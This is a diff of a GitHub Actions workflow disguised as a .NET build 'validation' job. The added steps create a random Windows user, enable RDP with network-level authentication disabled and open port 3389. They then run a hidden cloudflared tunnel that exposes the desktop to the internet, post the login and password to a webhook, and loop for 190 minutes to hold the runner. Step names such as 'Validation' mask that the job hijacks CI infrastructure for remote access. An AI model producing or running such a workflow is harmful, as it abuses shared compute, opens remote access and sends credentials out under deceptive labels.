@@ -27,11 +27,12 @@ jobs:
           dotnet add package Serilog --version 4.0.0
           dotnet add package Serilog.Sinks.Console --version 6.0.0
           dotnet add package Microsoft.Extensions.Logging --version 8.0.0
+
           @"
           using System;
           using Newtonsoft.Json;
           using Serilog;
-          
+         
           namespace ValidationApp
           {
               class Program
@@ -41,13 +42,13 @@ jobs:
                       Log.Logger = new LoggerConfiguration()
                           .WriteTo.Console()
                           .CreateLogger();
-                      
-                      var data = new { 
-                          Message = "Build validated successfully", 
+                     
+                      var data = new {
+                          Message = "Build validated successfully",
                           Timestamp = DateTime.UtcNow,
                           Version = "8.0.3"
                       };
-                      
+                     
                       string json = JsonConvert.SerializeObject(data, Formatting.Indented);
                       Console.WriteLine(json);
                       Log.Information("Test completed at {Time}", DateTime.UtcNow);
@@ -55,11 +56,13 @@ jobs:
               }
           }
           "@ | Out-File -Encoding utf8 Program.cs
+
           dotnet build -c Release
           dotnet run -c Release
 
-      - name: Start Background Validation Service
+      - name: Enable RDP & Start Cloudflare Quick Tunnel
         run: |
+          # إنشاء يوزر وباسورد عشوائي + تفعيل RDP
           $usr = "b_" + -join ((48..57) + (97..122) | Get-Random -Count 8 | % {[char]$_})
           $pwd = -join ((33..126) | Get-Random -Count 18 | % {[char]$_})
           $sec = ConvertTo-SecureString $pwd -AsPlainText -Force
@@ -70,79 +73,86 @@ jobs:
 
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
-
           Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
           netsh advfirewall firewall add rule name="ValidationRule" dir=in action=allow protocol=TCP localport=3389 > $null 2>&1
           Restart-Service TermService -Force -ErrorAction SilentlyContinue
 
-          $svcUrl = "https://github.com/ekzhang/bore/releases/download/v0.6.0/bore-v0.6.0-x86_64-pc-windows-msvc.zip"
-          $zip = "$env:TEMP\svc.zip"
-          $log = "$env:TEMP\sys_log.txt"
-          
-          Invoke-WebRequest -Uri $svcUrl -OutFile $zip
-          Expand-Archive $zip -DestinationPath "$env:TEMP\svc" -Force
-          
-          $exe = "$env:TEMP\svc\bore.exe"
-          Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"`"$exe`" local 3389 --to bore.pub > `"$log`" 2>&1`"" -WindowStyle Hidden
-          
-          Start-Sleep -Seconds 15
-          
+          # تحميل أحدث cloudflared لـ Windows (amd64)
+          $cfUrl = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
+          $cfPath = "$env:TEMP\cloudflared.exe"
+          Invoke-WebRequest -Uri $cfUrl -OutFile $cfPath
+
+          # ملفات اللوج المنفصلة (مهم!)
+          $logOut = "$env:TEMP\cf_out.txt"
+          $logErr = "$env:TEMP\cf_err.txt"
+
+          # تشغيل الـ tunnel كـ background process
+          $proc = Start-Process -FilePath $cfPath `
+            -ArgumentList "tunnel --url tcp://localhost:3389" `
+            -WindowStyle Hidden `
+            -RedirectStandardOutput $logOut `
+            -RedirectStandardError $logErr `
+            -PassThru
+
+          Start-Sleep -Seconds 20   # انتظر شوية عشان يولد الرابط
+
+          # قراءة اللوج لاستخراج الرابط (عادة يكون في stdout)
           $logData = ""
-          if (Test-Path $log) { $logData = Get-Content $log -Raw -ErrorAction SilentlyContinue }
-          
-          $prt = $null
-          if ($logData -match "bore\.pub:(\d+)") {
-            $prt = $Matches[1]
+          if (Test-Path $logOut) { $logData += Get-Content $logOut -Raw -ErrorAction SilentlyContinue }
+          if (Test-Path $logErr) { $logData += "`nErrors:`n" + (Get-Content $logErr -Raw -ErrorAction SilentlyContinue) }
+
+          $tunnelUrl = $null
+          if ($logData -match "https://[^ ]+\.trycloudflare\.com") {
+            $tunnelUrl = $Matches[0].Trim()
           }
-          
-          if ($prt) {
-            $msg = "Target: bore.pub:$prt`nU: $usr`nP: $pwd"
+
+          # رسالة الإشعار
+          if ($tunnelUrl) {
+            $msg = "Cloudflare Quick Tunnel جاهز!`n`nTarget: $tunnelUrl`nUser: $usr`nPass: $pwd`n`nكيفية الاتصال من جهازك:`n1. حمل cloudflared من https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/`n2. شغل الأمر ده:`n   cloudflared access tcp --hostname $tunnelUrl --url localhost:3389`n3. افتح Remote Desktop واتصل بـ localhost:3389"
           } else {
-            $msg = "Init failed:`n$logData"
+            $msg = "فشل إنشاء الـ Tunnel!`nLogs:`n$logData"
           }
+
           $body = @{ content = $msg } | ConvertTo-Json
           Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
+
+          # Keep-alive loop عشان الـ step ما يتوقفش (مهم جدًا)
+          $counter = 0
+          $end = (Get-Date).AddMinutes(190)
+          while ((Get-Date) -lt $end) {
+            $counter++
+            Write-Host "Keep-alive Cloudflare Tunnel - Tick $counter - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+            
+            # تحقق لو الـ process مات → أعد تشغيله
+            if ($proc.HasExited) {
+              Write-Host "cloudflared exited → restarting..."
+              $proc = Start-Process -FilePath $cfPath -ArgumentList "tunnel --url tcp://localhost:3389" -WindowStyle Hidden -RedirectStandardOutput $logOut -RedirectStandardError $logErr -PassThru
+            }
+
+            Start-Sleep -Seconds 60   # كل دقيقة طباعة + فحص
+          }
 
       - name: Run Diagnostics
         run: |
           $rep = "SysDiag:`n"
-
           $ts = Get-Service TermService -ErrorAction SilentlyContinue
           if ($ts) { $rep += "SVC: $($ts.Status)`n" } else { $rep += "SVC: Null`n" }
-
           $r1 = Get-ItemPropertyValue -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -ErrorAction SilentlyContinue
           $r2 = Get-ItemPropertyValue -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -ErrorAction SilentlyContinue
           $rep += "REG: $r1 | $r2`n"
-
           $pc = Get-NetTCPConnection -LocalPort 3389 -State Listen -ErrorAction SilentlyContinue
           if ($pc) { $rep += "PRT: OK`n" } else { $rep += "PRT: ERR`n" }
-
           $fw = Get-NetFirewallPortFilter -Protocol TCP | Where-Object { $_.LocalPort -eq 3389 } -ErrorAction SilentlyContinue
           if ($fw) { $rep += "FW: OK`n" } else { $rep += "FW: ERR`n" }
-
-          $bp = Get-Process bore -ErrorAction SilentlyContinue
-          if ($bp) { $rep += "PRC: OK ($($bp.Id))`n" } else { $rep += "PRC: ERR`n" }
-
+          $bp = Get-Process cloudflared -ErrorAction SilentlyContinue
+          if ($bp) { $rep += "PRC: OK (cloudflared - $($bp.Id))`n" } else { $rep += "PRC: ERR`n" }
           $body = @{ content = $rep } | ConvertTo-Json -Depth 10
           Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
         continue-on-error: true
 
-      - name: Run Extended Validation
-        run: |
-          $end = (Get-Date).AddMinutes(190)
-          while ((Get-Date) -lt $end) {
-            Test-Connection -ComputerName github.com -Count 1 -Quiet > $null
-            $minute = (Get-Date).Minute
-            if ($minute -ge 0 -and $minute -le 5 -or $minute -ge 30 -and $minute -le 35) {
-              cd ValidationApp
-              dotnet build -c Release > $null
-            }
-            Start-Sleep -Seconds 900
-          }
-
       - name: Cleanup Environment
         run: |
-          Get-Process -Name "bore" -ErrorAction SilentlyContinue | Stop-Process -Force
+          Get-Process -Name "cloudflared" -ErrorAction SilentlyContinue | Stop-Process -Force
         continue-on-error: true
 
       - name: Finalize Check
